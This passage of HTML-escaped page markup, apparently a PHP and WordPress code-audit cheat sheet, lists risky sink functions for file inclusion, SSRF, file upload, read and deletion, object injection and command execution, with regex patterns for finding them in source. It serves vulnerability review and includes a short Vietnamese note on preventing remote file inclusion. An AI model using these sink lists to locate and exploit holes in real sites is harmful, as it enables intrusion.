href=&#34;#local-file-inclusion-lfi&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.include.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;include&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.include-once.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;include_once&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.require.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;require&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.require-once.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;require_once&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(include|require)(_once)?\b&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Remote File Inclusion (RFI) xảy ra khi ứng dụng PHP cho phép &lt;code&gt;include&lt;/code&gt;/&lt;code&gt;require&lt;/code&gt; một tập tin từ URL do người dùng kiểm soát — điều kiện thường là &lt;code&gt;allow_url_fopen&lt;/code&gt; và &lt;code&gt;allow_url_include&lt;/code&gt; bật — dẫn tới việc tải và thực thi mã PHP từ máy chủ từ xa, gây &lt;strong&gt;remote code execution&lt;/strong&gt;. Ngăn chặn bằng cách tắt &lt;code&gt;allow_url_include&lt;/code&gt;, không dùng input trực tiếp trong include/require, và áp whitelist/normalize đường dẫn.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;server-side-request-forgery-ssrf&#34;&gt;&lt;span&gt;Server Side Request Forgery (SSRF)&lt;/span&gt;&#xA;  &lt;a href=&#34;#server-side-request-forgery-ssrf&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.readfile.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;readfile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fopen.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fopen&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.stream-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;stream_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.curl-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;curl_exec&lt;/code&gt; / &lt;code&gt;cURL&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(file_get_contents|readfile|fopen|stream_get_contents|curl_exec|curl_init|curl_setopt|curl_multi_exec)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_head/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_head&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_get/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_get&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_post&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_remote_request/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_remote_request&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\bwp_remote_(head|get|post|request)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-upload&#34;&gt;&lt;span&gt;Arbitrary File Upload&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-upload&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.move-uploaded-file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;move_uploaded_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-put-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_put_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fwrite.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fwrite&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fputs.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fputs&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.copy.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;copy&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fputcsv.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fputcsv&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.rename.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;rename&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/ziparchive.extractto.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;ZipArchive::extractTo&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/phardata.extractto.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;PharData::extractTo&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/unzip_file/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unzip_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(move_uploaded_file|file_put_contents|fwrite|fputs|copy|fputcsv|rename|ZipArchive::extractTo|PharData::extractTo|unzip_file)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-put_contents&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::put_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-move&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::move&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-copy&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::copy&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_handle_upload()&lt;/code&gt; with &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(WP_Filesystem_Direct::put_contents|WP_Filesystem_Direct::move|WP_Filesystem_Direct::copy|wp_handle_upload)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-read&#34;&gt;&lt;span&gt;Arbitrary File Read&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-read&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file-get-contents.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file_get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.readfile.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;readfile&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fopen.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fopen&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fread.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fread&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgets.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgets&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgetcsv.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgetcsv&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.fgetss.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;fgetss&lt;/code&gt; (deprecated from PHP 7.3)&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.file.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.curl-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;curl_exec&lt;/code&gt; / cURL&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(file_get_contents|readfile|fopen|fread|fgets|fgetcsv|fgetss|curl_exec)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-get_contents&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::get_contents&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-get_contents-array&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::get_contents_array&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(WP_Filesystem_Direct::get_contents|WP_Filesystem_Direct::get_contents_array)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;arbitrary-file-deletion&#34;&gt;&lt;span&gt;Arbitrary File Deletion&lt;/span&gt;&#xA;  &lt;a href=&#34;#arbitrary-file-deletion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;PHP related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.unlink.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unlink&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function/rmdir.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;rmdir&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(unlink|rmdir)\b&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress related&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_delete_file/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_delete_file&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_delete_file_from_directory/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_delete_file_from_directory&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-delete&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::delete&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_filesystem_direct/#method-rmdir&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;WP_Filesystem_Direct::rmdir&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(wp_delete_file|wp_delete_file_from_directory|WP_Filesystem_Direct::delete|WP_Filesystem_Direct::rmdir)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;php-object-injection&#34;&gt;&lt;span&gt;PHP Object Injection&lt;/span&gt;&#xA;  &lt;a href=&#34;#php-object-injection&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.unserialize.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;unserialize&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/maybe_unserialize/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;maybe_unserialize&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;\b(unserialize|maybe_unserialize)\b&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;remote-code-execution-rce&#34;&gt;&lt;span&gt;Remote Code Execution (RCE)&lt;/span&gt;&#xA;  &lt;a href=&#34;#remote-code-execution-rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.system.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;system&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;exec&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.shell-exec.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;shell_exec&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.passthru.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;passthru&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.proc-open.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;proc_open&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://www.php.net/manual/en/function.eval.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 